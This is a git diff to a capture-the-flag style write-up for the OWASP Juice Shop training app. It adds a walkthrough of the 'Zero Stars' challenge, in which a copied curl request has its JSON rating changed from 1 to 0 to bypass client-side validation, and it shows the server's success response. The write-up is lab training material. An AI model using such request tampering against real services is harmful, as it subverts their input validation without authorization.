@@ -12,7 +12,7 @@
 | Score Board | Find the carefully hidden 'Score Board' page. | :white_check_mark:
 | XSS Tier 0 | Perform a reflected XSS attack with an iframe alerting XSS. | :white_check_mark:
 | XSS Tier 1 | Perform a DOM XSS attack with an iframe alerting XSS. | :white_check_mark:
-| Zero Stars | Give a devastating zero-star feedback to the store. | :heavy_minus_sign:
+| Zero Stars | Give a devastating zero-star feedback to the store. | :white_check_mark:
 
 ## Solutions
 
@@ -144,7 +144,31 @@ Yep, it did. Always sanitize user input, even on the front end! Solved!
 ### Zero Stars
 >  Give a devastating zero-star feedback to the store.
 
-* Solved? :heavy_minus_sign:
+* Solved? :white_check_mark:
 * Tools Used: Chrome, Chrome Inspector, curl
 
-TODO
+So, like the other level 1 challenges, this was also easy. First, I needed to go to the customer feedback page, and write a "legit" review with the Chrome Inspector up and set to the Network Tab. After you submit the request, right click on it, and select _Copy_ > _Copy as curl_.
+
+<img src="images/1-zero-stars-copy-as-curl.png">
+
+Then, I opened up terminal, pasted the copied request and changed the --data-binary option payload from this...
+
+```
+--data-binary '{"UserId":15,"captchaId":1,"captcha":"7","comment":"x","rating":1}'
+```
+
+...to this. 
+
+```
+--data-binary '{"UserId":15,"captchaId":1,"captcha":"7","comment":"x","rating":0}'
+```
+
+All I did was change the rating from 1 to 0, and pressed enter. A second later, a successful response appears in the terminal.
+
+```
+{"status":"success","data":{"id":9,"UserId":15,"comment":"x","rating":0,"updatedAt":"2019-08-11T00:37:08.437Z","createdAt":"2019-08-11T00:37:08.437Z"}}
+```
+
+Remember to validate your inputs! Solved!
+
+<img src="images/1-zero-stars-solved.png">
